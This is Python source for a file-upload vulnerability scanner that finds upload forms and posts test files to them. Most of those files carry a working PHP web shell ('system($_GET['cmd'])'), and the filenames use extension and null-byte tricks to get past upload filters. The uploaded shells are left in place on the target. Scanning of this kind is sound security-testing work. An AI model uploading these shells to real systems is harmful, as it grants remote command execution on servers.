"""
File Upload Vulnerability Scanner
Author: ARIF
"""

import asyncio
import logging
from typing import List, Optional, Dict
from core.engine import Vulnerability, Severity
from core.requester import Requester


class UploadScanner:
    def __init__(self, config: Dict):
        self.logger = logging.getLogger(__name__)
        self.config = config
        self.requester = Requester(config)
        self.vulnerabilities = []
        self.results_lock = asyncio.Lock()

    async def scan(self, target: str) -> List[Vulnerability]:
        self.logger.info(f"Starting File Upload scan on {target}")
        self.vulnerabilities = []
        try:
            response = await self.requester.get(target)
            if not response:
                return self.vulnerabilities
            html = await response.text()
            forms = await self.requester.extract_forms(target, html)
            upload_forms = [
                f for f in forms
                if any(inp.get("type") == "file" for inp in f.get("inputs", []))
            ]

            tasks = []
            for form in upload_forms:
                tasks.append(self._test_file_upload(form, target))
            if not upload_forms:
                potential_uploads = self._find_upload_endpoints(target)
                for endpoint in potential_uploads:
                    tasks.append(self._test_upload_endpoint(endpoint))

            if tasks:
                await asyncio.gather(*tasks)
        except Exception as e:
            self.logger.error(f"File Upload scan error on {target}: {e}")
        return self.vulnerabilities

    def _find_upload_endpoints(self, target: str) -> List[str]:
        endpoints = ["/upload", "/uploads", "/file-upload", "/api/upload", "/upload.php",
                     "/upload.aspx", "/upload.jsp", "/upload.py", "/image-upload",
                     "/media/upload", "/attachment", "/file", "/api/files"]
        return [target.rstrip('/') + ep for ep in endpoints]

    async def _test_file_upload(self, form: Dict, base_url: str) -> None:
        test_files = [
            ("test.php", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.php5", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.phtml", "<?php system($_GET['cmd']); ?>", "application/x-php"),
            ("test.php.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("test.asp", "<% response.write(\"test\") %>", "application/x-asap"),
            ("test.aspx", "<%@ Page Language=\"C#\" %><%= \"test\" %>", "application/x-aspx"),
            ("test.jsp", "<% out.println(\"test\"); %>", "application/x-jsp"),
            ("test.cgi", "#!/bin/bash\necho Content-type: text/html\necho \"test\"", "application/x-cgi"),
            ("test.pl", "#!/usr/bin/perl\nprint \"test\";", "application/x-perl"),
            ("test.shtml", "<!--#echo var=\"DATE_LOCAL\" -->", "text/html"),
            ("test.php;.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("test.p%00.jpg", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("test.php.", "<?php system($_GET['cmd']); ?>", "image/jpeg"),
            ("test.PhP", "<?php system($_GET['cmd']); ?>", "application/x-php"),
        ]

        file_inputs = [i for i in form.get("inputs", []) if i.get("type") == "file"]
        if not file_inputs:
            return

        for filename, content, content_type in test_files:
            try:
                import aiohttp
                data = aiohttp.FormData()
                for inp in form.get("inputs", []):
                    if inp.get("type") == "file":
                        data.add_field(
                            inp["name"],
                            content.encode(),
                            filename=filename,
                            content_type=content_type
                        )
                    elif inp.get("value"):
                        data.add_field(inp["name"], inp["value"])

                method = form.get("method", "POST").upper()
                action = form.get("action", base_url)

                if method == "POST":
                    response = await self.requester.post(action, data=data)
                else:
                    continue

                if response:
                    test_html = await response.text()
                    indicators = ["uploaded", "success", "upload successful", "file received",
                                  "uploaded successfully", "filename", "uploads/"]
                    for indicator in indicators:
                        if indicator.lower() in test_html.lower():
                            vuln = Vulnerability(
                                name="File Upload Vulnerability",
                                description=f"Insecure file upload - can upload potentially dangerous files ({filename})",
                                severity=Severity.HIGH,
                                url=action,
                                parameter=file_inputs[0]["name"],
                                payload=filename,
                                evidence=f"Upload response: '{test_html[:200]}' suggests file may be accepted",
                                remediation="Validate file extension, MIME type, and content. Store files outside webroot. Use random filenames. Scan files for malware.",
                                cvss_score=7.5,
                                confidence=0.7,
                                module="upload"
                            )
                            async with self.results_lock:
                                self.vulnerabilities.append(vuln)
                            return
            except Exception as e:
                self.logger.debug(f"File upload test error: {e}")

    async def _test_upload_endpoint(self, url: str) -> None:
        import aiohttp
        for filename in ["test.php", "test.aspx", "test.jsp"]:
            try:
                data = aiohttp.FormData()
                data.add_field("file", b"test content", filename=filename)
                response = await self.requester.post(url, data=data)
                if response and response.status == 200:
                    test_html = await response.text()
                    if "failed" not in test_html.lower() and "error" not in test_html.lower():
                        vuln = Vulnerability(
                            name="File Upload Endpoint Found",
                            description=f"Potential file upload endpoint at {url} - accepts file uploads",
                            severity=Severity.MEDIUM,
                            url=url,
                            parameter="file",
                            payload=filename,
                            evidence=f"UI endpoint accepts uploads. Status: {response.status}",
                            remediation="Restrict upload access. Validate all uploads.",
                            cvss_score=5.0,
                            confidence=0.5,
                            module="upload"
                        )
                        async with self.results_lock:
                            self.vulnerabilities.append(vuln)
            except Exception:
                pass
